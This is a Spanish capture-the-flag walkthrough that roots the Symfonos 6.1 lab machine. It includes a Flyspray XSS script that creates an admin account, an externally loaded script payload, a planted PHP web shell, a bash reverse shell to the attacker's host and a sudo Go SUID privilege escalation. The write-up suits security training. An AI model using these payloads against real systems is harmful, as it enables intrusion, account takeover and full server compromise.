# Symfonos 6.1 Vulnhub Writeup

Empezamos con un barrido de la red para identificar la máquina objetivo.

```bash
sudo arp-scan -I ens33 --localnet --ignoredups

192.168.0.38	00:0c:29:a0:39:e8	VMware, Inc.
```

Veamos que sistema operativo está corriendo en la máquina objetivo con nuestra herramienta `whichSystem` la cual comprueba al TTL y nos devuelve el sistema operativo.

```bash
whichSystem.py 192.168.0.38

192.168.0.38 (ttl -> 64): Linux
```

Escaneamos con nmap para ver que puertos están abiertos y que servicios están corriendo.

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.38 -oG allPorts

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
```

Ahora veamos que versión de servicios están corriendo en los puertos abiertos.

```bash
sudo nmap -sCV -p22,80,3000,3306,5000 192.168.0.38

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 0e:ad:33:fc:1a:1e:85:54:64:13:39:14:68:09:c1:70 (RSA)
|   256 54:03:9b:48:55:de:b3:2b:0a:78:90:4a:b3:1f:fa:cd (ECDSA)
|_  256 4e:0c:e6:3d:5c:08:09:f4:11:48:85:a2:e7:fb:8f:b7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
3000/tcp open  http    Golang net/http server
|_http-title:  Symfonos6
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=1f2c19ff883e8e7a; Path=/; HttpOnly
|     Set-Cookie: _csrf=2tQsp0tyQLOwcMA4B1pRKcQwKVE6MTc4MjQ2NTk3NTY3OTg5NjUwNw; Path=/; Expires=Sat, 27 Jun 2026 09:26:15 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 26 Jun 2026 09:26:15 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|     console.info('ServiceWorker registration successful with scope: ', registrat
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=905bc622f7108ff6; Path=/; HttpOnly
|     Set-Cookie: _csrf=0rRUGNbJDdy3H_Ezi54CFVmvsXs6MTc4MjQ2NTk3NTcwMDM3MzUwNA; Path=/; Expires=Sat, 27 Jun 2026 09:26:15 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 26 Jun 2026 09:26:15 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|_    console.info('ServiceWorker registration successful
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
5000/tcp open  http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Fri, 26 Jun 2026 09:26:30 GMT
|     Content-Length: 18
|     page not found
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Fri, 26 Jun 2026 09:26:15 GMT
|     Content-Length: 18
|     page not found
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Fri, 26 Jun 2026 09:26:25 GMT
|     Content-Length: 18
|     page not found
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header

```

Empezamos con el puerto 22, el cual es un servicio SSH. Vemos que está corriendo OpenSSH 7.4 y buscando en searchsploit encontramos lo siguiente:

```bash
searchsploit OpenSSH 7.4

OpenSSH 2.3 < 7.7 - Username Enumeration | linux/remote/45233.py
```

Por lo que tenemos una forma potencial de enumerar usuarios en el servicio SSH. Lo dejaremos para luego.

Al visitar http://192.168.0.38/ vemos una imagen:

![alt text](image.png)

En http://192.168.0.38:3000/ hay un servicio web llamado Symfonos6 y es similar a Gitea, un servicio de repositorios git, de hecho vemos este mensaje ` Powered by Gitea Version: 1.11.4 Page: 0ms Template: 0ms `

![alt text](image-1.png)

Si buscamos en searchsploit encontramos lo siguiente:

```bash
searchsploit Gitea

Gitea 1.12.5 - Remote Code Execution (Authenticated) | multiple/webapps/49571.py
Gitea 1.16.6 - Remote Code Execution (RCE) (Metasploit) | multiple/webapps/51009.rb
```

Tenemos 2 exploits, pero ambos requieren autenticación, por lo que primero necesitamos encontrar credenciales.

Aquí hay un montón de info:

1. En /explore vemos 2 usuarios: achilles y zayotic
2. Existe un Login en /user/login 

Vamos antes que nada a hacer un escaneo de directorios con gobuster para ver si encontramos algo interesante.

```bash
gobuster dir -u 'http://192.168.0.38:3000' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 | grep -v "ERROR"

/img                  (Status: 302) [Size: 27] [--> /img]
/admin                (Status: 302) [Size: 34] [--> /user/login]
/issues               (Status: 302) [Size: 34] [--> /user/login]
/css                  (Status: 302) [Size: 27] [--> /css]
/avatars              (Status: 302) [Size: 31] [--> /avatars]
/js                   (Status: 302)[Size: 26] [--> /js]
/vendor               (Status: 302) [Size: 30] [--> /vendor]
/explore              (Status: 302) [Size: 37] [--> /explore/repos]
/debug                (Status: 200) [Size: 160]
/milestones           (Status: 302) [Size: 34] [--> /user/login]
/notifications        (Status: 302) [Size: 34] [--> /user/login]
/achilles             (Status: 200) [Size: 11611]
```

---

Al ir a iniciar sesión en /user/login, interceptamos la petición y vemos que manda lo siguiente:

```
_csrf=w4Ge6Wz2Rks8LP-hPMwINCpAt-o6MTc4MjQ2NjIzNTY2NjY2MTgzMA&user_name=a&password=a
```

Ese csrf token es generado por el servidor.

```bash
gobuster dir -u 'http://192.168.0.38' -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20

/posts                (Status: 301) [Size: 234] [--> http://192.168.0.38/posts/]
```

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://192.168.0.38/FUZZ --hc=404

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000001560:   301        7 L      20 W       234 Ch      "posts"
000025060:   301        7 L      20 W       237 Ch      "flyspray"
```
En /posts vemos un mensaje:

```
The warrior Achilles is one of the great heroes of Greek mythology. According to legend, Achilles was extraordinarily strong, courageous and loyal, but he had one vulnerability–his Achilles heel. Homer’s epic poem The Iliad tells the story of his adventures during the last year of the Trojan War.
```
 
Vemos que hay un directorio llamado /flyspray, vamos a visitarlo y nos encontramos con un servicio web llamado Flyspray, el cual es un sistema de seguimiento de errores y gestión de proyectos.

SI buscamos en searchsploit encontramos lo siguiente:

```bash
searchsploit Flyspray

FlySpray 1.0-rc4 - Cross-Site Scripting / Cross-Site Request Forgery | php/webapps/41918.txt
```

Para saber la versión buscamos algún tipo de changelog o algo similar:

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://192.168.0.38/flyspray/FUZZ --hc=404

000000090:   301        7 L      20 W       242 Ch      "docs"

```

Nos metemos en /flyspray/docs y vemos un changelog:
##Upgrading 0.9.9.* to 1.0* (1.0 alphas, 1.0 betas, Flyspray master branch on github.com)##

Por lo que podemos deducir que la versión de Flyspray es 1.0.

```
A vulnerability has been discovered in Flyspray , which can be
exploited by malicious people to conduct cross-site scripting attacks. Input
passed via the 'real_name' parameter to '/index.php?do=myprofile' is not
properly sanitised before being returned to the user. This can be exploited
to execute arbitrary HTML and script code in a user's browser session in
context of an affected site.

The script is executed on the parameter page AND on any page that allow the
user to put a comment.


This XSS vector allow to execute scripts to gather the CSRF token

and submit a form to create a new admin
```

```js
var tok = document.getElementsByName('csrftoken')[0].value;

var txt = '<form method="POST" id="hacked_form" action="index.php?do=admin&area=newuser">'
txt += '<input type="hidden" name="action" value="admin.newuser"/>'
txt += '<input type="hidden" name="do" value="admin"/>'
txt += '<input type="hidden" name="area" value="newuser"/>'
txt += '<input type="hidden" name="user_name" value="hacker"/>'
txt += '<input type="hidden" name="csrftoken" value="' + tok + '"/>'
txt += '<input type="hidden" name="user_pass" value="12345678"/>'
txt += '<input type="hidden" name="user_pass2" value="12345678"/>'
txt += '<input type="hidden" name="real_name" value="root"/>'
txt += '<input type="hidden" name="email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="verify_email_address" value="root@root.com"/>'
txt += '<input type="hidden" name="jabber_id" value=""/>'
txt += '<input type="hidden" name="notify_type" value="0"/>'
txt += '<input type="hidden" name="time_zone" value="0"/>'
txt += '<input type="hidden" name="group_in" value="1"/>'
txt += '</form>'

var d1 = document.getElementById('menu');
d1.insertAdjacentHTML('afterend', txt);
document.getElementById("hacked_form").submit();
```

This will create a new admin account, hacker:12345678

Vamos a crearnos un perfil en Flyspray y luego vamos a editarlo para poner el código de arriba en el campo `real_name`. Esto nos creará un nuevo usuario administrador con las credenciales hacker:12345678.

![alt text](image-2.png)

Hay que tener en cuenta que el vector de ataque es un XSS, por lo que lo que vamos a introducir en el campo `real_name` es un script que vamos a poner desde nuestro pc.

```html
"><script src="http://192.168.0.19/xss.js"></script>
```

Antes que nada vemos que en la task que existe  hay un admin llamado `Mr Super User` que pone el siguiente mensaje:

```
 I will be checking this page frequently for updates.
```
Por lo que podemos deducir que el admin va a visitar nuestra página y se va a ejecutar el script que hemos puesto en el campo `real_name`.

Por eso debemos poner un comentario para que el admin visite la página y se ejecute el script.

Y en nuestro pc montamos un servidor web con python para servir el script xss.js que contiene el código de arriba.

```bash
python3 -m http.server 80

192.168.0.38 - - [26/Jun/2026 12:08:21] "GET /xss.js HTTP/1.1" 200 -
```

Vemos que al actualizar el perfil y poner el script en el campo `real_name`, se ejecuta el script y nos crea un nuevo usuario administrador con las credenciales hacker:12345678.

Vemos una nueva tarea en Flyspray llamada Feature Request

```
 FS#2 - self hosted git service

I have configured gitea for our git needs internally!

Here are my creds in case anyone wants to check out our project!

achilles:h2sBr9gryBunKdF9
```

Tenemos las credenciales de un usuario llamado achilles, vamos a probarlas en el login de Symfonos6 y vemos que funcionan.

![alt text](image-3.png)

Vemos que tiene 2 repositorios, uno llamado `symfonos-blog` y otro llamado `symfonos-api` 

Al investigar, vemos que el repositorio symfonos-blog tiene un archivo llamado `dbconfig.php` el cual contiene las credenciales de la base de datos:

```php
    <?php
    $GLOBALS['dbConfig'] = array(
        'host' => '127.0.0.1:3306',
        'user' => 'root',
        'pass' => 'password',
        'db' => 'api'
    );
```

Con estas credenciales podemos conectarnos a la base de datos MySQL que está corriendo en el puerto 3306.

```bash
mysql -h 127.0.0.1 -P 3306 -u root -p password

Host '192.168.0.19' is not allowed to connect to this MariaDB server
```

También vemos que en blog hay esto en el index.php:

```php
        <?php
        while ($row = mysqli_fetch_assoc($result)) {
		$content = htmlspecialchars($row['text']);
		
		echo $content;
	
		preg_replace('/.*/e',$content, "Win");
        }
	?>

```

Esto nos indica que hay una vulnerabilidad de inyección de código PHP, ya que la función `preg_replace` con el modificador `/e` evalúa el contenido como código PHP.

Ahora en la api hay cosas muy interesantes:

1. Vemos la api que está corriendo en el puerto 5000

```go
    package api

    import (
    	"github.com/gin-gonic/gin"
    	"symfonos.local/achilles/api/api/v1.0"
    )

    // ApplyRoutes applies router to gin Router
    func ApplyRoutes(r *gin.Engine) {
    	api := r.Group("/ls2o4g")
    	{
    		apiv1.ApplyRoutes(api)
    	}
    }
```

Al visitar http://192.168.0.38/ls2o4g/ vemos que nos devuelve un 404, por lo que no hay nada ahí.

2. Vemos una versión 1.0 de la api en el archivo `api/v1.0/v1.0.go`:

```go
    package apiv1

    import (
    	"github.com/gin-gonic/gin"
    	"symfonos.local/achilles/api/api/v1.0/auth"
    	"symfonos.local/achilles/api/api/v1.0/posts"
    )

    func ping(c *gin.Context) {
    	c.JSON(200, gin.H{
    		"message": "pong",
    	})
    }

    // ApplyRoutes applies router to the gin Engine
    func ApplyRoutes(r *gin.RouterGroup) {
    	v1 := r.Group("/v1.0")
    	{
    		v1.GET("/ping", ping)
    		auth.ApplyRoutes(v1)
    		posts.ApplyRoutes(v1)
    	}
    }
```

Esta nos indica que hay un endpoint de ping en la api, por lo que podemos probarlo:

```bash
curl -s -X GET "http://192.168.0.38/ls2o4g/v1.0/ping"

{"message":"pong"}
```

Ya tenemos una ruta de la api.

También tenemos /api/v1.0/auth y /api/v1.0/posts, por lo que podemos investigar un poco más.

En auth vemos que hay un endpoint de login:

```go
    package auth

    import (
    	"github.com/gin-gonic/gin"
    )

    // ApplyRoutes applies router to the gin Engine
    func ApplyRoutes(r *gin.RouterGroup) {
    	auth := r.Group("/auth")
    	{
    		auth.POST("/login", login)
    		auth.GET("/check", check)
    	}
    }
```

También vemos que todo se tramita mediante json, por lo que podemos hacer un login con las credenciales de achilles:

```bash
curl -s -X POST "http://192.168.0.38:5000/ls2o4g/v1.0/auth/login" -H "Content-Type: application/json" -d '{"username":"achilles","password":"h2sBr9gryBunKdF9"}' | jq

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODMwODA3OTMsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.ApebTRZMifWIheTnDK5iF_MKVHh1KW_mwq1an8iqFG0",
  "user": {
    "display_name": "achilles",
    "id": 1,
    "username": "achilles"
  }
}
```

Tenemos un token JWT que nos permite autenticarnos en la api.

Al analizar el token con jwt.io vemos que contiene la siguiente información:

```json
{
  "exp": 1783080793,
  "user": {
    "display_name": "achilles",
    "id": 1,
    "username": "achilles"
  }
}
```
Algoritmo
HS256

En posts vemos que hay un endpoint de posts:

```go

Raw
Permalink
Blame
History

    package posts

    import (
    	"github.com/gin-gonic/gin"
    	"symfonos.local/achilles/api/lib/middlewares"
    )

    // ApplyRoutes applies router to the gin Engine
    func ApplyRoutes(r *gin.RouterGroup) {
    	posts := r.Group("/posts")
    	{
    		posts.POST("/", middlewares.Authorized, create)
    		posts.GET("/", list)
    		posts.GET("/:id", read)
    		posts.DELETE("/:id", middlewares.Authorized, remove)
    		posts.PATCH("/:id", middlewares.Authorized, update)
    	}
    }
```

Vemos que para crear, eliminar y actualizar posts necesitamos estar autenticados, pero para listar y leer posts no necesitamos autenticación.

Vamos a probar el endpoint de listar posts:

```bash
curl -s -X GET "http://192.168.0.38:5000/ls2o4g/v1.0/posts/"

[{"created_at":"2020-04-02T04:41:22-04:00","id":1,"text":"The warrior Achilles is one of the great heroes of Greek mythology. According to legend, Achilles was extraordinarily strong, courageous and loyal, but he had one vulnerability–his Achilles heel. Homer’s epic poem The Iliad tells the story of his adventures during the last year of the Trojan War.","user":{"display_name":"achilles","id":1,"username":"achilles"}}]%
```

Ahora con las credenciales de achilles podemos alterar un post con el endpoint de PATCH posts para que nos interprete el codigo php pues ya vimos que hay una vulnerabilidad de inyección de código PHP en el blog.

Debemos hacer que el payload que enviemos contenga el código PHP que queremos ejecutar pero en base64 para que no nos de error de sintaxis. Para ello haremos uso de funciones php como file_put_contents y base64_decode para decodificar el payload y escribirlo en un archivo .php en el servidor.

```bash
cat cmd2.php3
<?php
  system($_GET['cmd']);
?>

base64 cmd2.php3
PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K
```

```bash
curl -s -X PATCH "http://192.168.0.38:5000/ls2o4g/v1.0/posts/1" -H "Content-Type: application/json" -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3ODMwODA3OTMsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.ApebTRZMifWIheTnDK5iF_MKVHh1KW_mwq1an8iqFG0" -d $'{"text": "file_put_contents(\'cmd.php\', base64_decode(\'PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K\'))"}'

{"created_at":"2020-04-02T04:41:22-04:00","id":1,"text":"file_put_contents('cmd.php', base64_decode('PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K'))","user":{"display_name":"achilles","id":1,"username":"achilles"}}
```

Vamos a http://192.168.0.38/posts/ para que se ejecute el código y nos cree un archivo cmd.php en el servidor.

http://192.168.0.38/posts/cmd.php

![alt text](image-4.png)

Hemos logrado conseguir una ejecución remota de comandos en el servidor, vamos a darnos una reverse shell con netcat:

http://192.168.0.38/posts/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/192.168.0.19/443 0>%261'

```bash
nc -lvnp 443

Connection received on 192.168.0.38 47156
bash: no job control in this shell
bash-4.2$ whoami
apache
```

Vamos a hacer un tratamiento de la TTY:

```bash
script /dev/null -c bash
CTRL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 cols 184
```

## Escalando privilegios

Vamos a hacer las comprobaciones tipicas para ver si podemos escalar privilegios:

```bash
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.2$ sudo -l
[sudo] password for apache:
bash-4.2$ cat /etc/os-release 
NAME="CentOS Linux"
VERSION="7 (Core)"

bash-4.2$ find / -perm -4000 2>/dev/null
```

También vemos que esta el directorio de achilles, por lo que vamos a ver si podemos pivotar a ese usuario

```bash
su - achilles
# Password: h2sBr9gryBunKdF9
```

En nustro equipo generamos un par de claves SSH y nos copiamos la clave pública al archivo authorized_keys del usuario achilles:

```bash
ssh-keygen
cat ~/.ssh/id_rsa.pub
```

```bash
vi /home/achilles/.ssh/authorized_keys
# Borramos lo que hay y pegamos la clave pública que hemos generado en nuestro equipo
chmod 600 /home/achilles/.ssh/authorized_keys
```

Ahora nos podemos loguear como achilles mediante SSH sin necesidad de contraseña

```bash
ssh achilles@192.168.0.38
```

Ahora volvemos a comprobar lo de antes:

```bash
[achilles@symfonos6 ~]$ id
uid=1000(achilles) gid=1000(achilles) groups=1000(achilles),48(apache)

[achilles@symfonos6 ~]$ sudo -l

User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
```

Vamos a crear un script en Go que nos de una shell con privilegios de root, ya que achilles puede ejecutar go como root sin necesidad de contraseña.

```go
package main

import (
    "os/exec"
)

func main() {
    cmd := exec.Command("chmod", "u+s", "/bin/bash")
    err := cmd.Run()
    if err != nil {
        panic(err)
    }
}
```

```bash
[achilles@symfonos6 ~]$ sudo /usr/local/go/bin/go run script.go 
[achilles@symfonos6 ~]$ bash -p
bash-4.2# whoami
root
bash-4.2# cd /root
bash-4.2# ls
proof.txt  scripts
bash-4.2# cat proof.txt 

           Congrats on rooting symfonos:6!
                  ,_---~~~~~----._         
           _,,_,*^____      _____``*g*\"*, 
          / __/ /'     ^.  /      \ ^@q   f 
         [  @f | @))    |  | @))   l  0 _/  
          \`/   \~____ / __ \_____/    \   
           |           _l__l_           I   
           }          [______]           I  
           ]            | | |            |  
           ]             ~ ~             |  
           |                            |   
            |                           |   
     Contact me via Twitter @zayotic to give feedback```
```

Vamos a meternos en la base de datos MySQL que está corriendo en el puerto 3306 con las credenciales que encontramos en el archivo dbconfig.php:

```bash
mysql -h 127.0.0.1 -P 3306 -u root -p api
# Password: password

Welcome to the MariaDB monitor.
MariaDB [api]> 
```

Vamos a leer la tabla users para ver si encontramos algo interesante:

```sql
MariaDB [api]> show tables;
+---------------+
| Tables_in_api |
+---------------+
| posts         |
| users         |
+---------------+

MariaDB [api]> select * from users;
select * from users;
+----+---------------------+---------------------+------------+----------+--------------+--------------------------------------------------------------+
| id | created_at          | updated_at          | deleted_at | username | display_name | password_hash                                                |
+----+---------------------+---------------------+------------+----------+--------------+--------------------------------------------------------------+
|  1 | 2020-04-02 04:38:27 | 2026-06-26 08:28:51 | NULL       | achilles | achilles     | $2y$12$XNeo2nbkBcZ/d/20szOH.OZcI.zS6rooVbXRtdp2ys5F3tpvmi64O |
+----+---------------------+---------------------+------------+----------+--------------+--------------------------------------------------------------+

MariaDB [api]> select * from posts;
select * from posts;
+----+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------+---------+
| id | created_at          | updated_at          | deleted_at | text                                                                                        | user_id |
+----+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------+---------+
|  1 | 2020-04-02 04:41:22 | 2026-06-26 08:28:51 | NULL       | file_put_contents('cmd.php', base64_decode('PD9waHAKICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsKPz4K')) |       1 |
+----+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------+---------+
```

## Conclusión

Hemos logrado rootear la máquina encontrando varias vulnerabilidades, incluyendo XSS en Flyspray, inyección de código PHP en el blog y una escalada de privilegios mediante la ejecución de Go como root.